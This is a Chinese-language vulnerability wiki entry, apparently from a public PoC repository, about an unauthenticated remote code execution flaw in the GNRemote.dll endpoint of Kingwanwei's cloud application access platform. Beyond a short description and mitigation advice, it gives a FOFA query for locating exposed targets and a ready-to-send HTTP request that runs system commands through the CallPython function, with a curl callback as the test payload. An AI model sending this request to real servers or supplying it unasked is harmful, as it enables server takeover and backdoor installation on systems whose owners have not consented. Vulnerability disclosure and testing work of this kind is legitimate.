---
fofa: "title="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# 金万维-云联应用系统接入平台 GNRemote.dll 前台RCE漏洞

# 漏洞描述

金万维-云联应用系统接入平台 GNRemote.dll接口存在远程命令执行漏洞，未经身份验证的远程攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

影响版本

云联应用系统接入平台

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：title="云联应用系统接入平台"

POC/EXP：

GET /GNRemote.dll?GNFunction=CallPython&pyFile=os&pyFunc=system&pyArgu=curl+dnsHTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

![image-20240729120809517](./.resource/金万维-云联应用系统接入平台GNRemote.dll前台RCE漏洞/media/image-20240729120809517.png)


![image-20240729120849418](./.resource/金万维-云联应用系统接入平台GNRemote.dll前台RCE漏洞/media/image-20240729120849418.png)


# 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
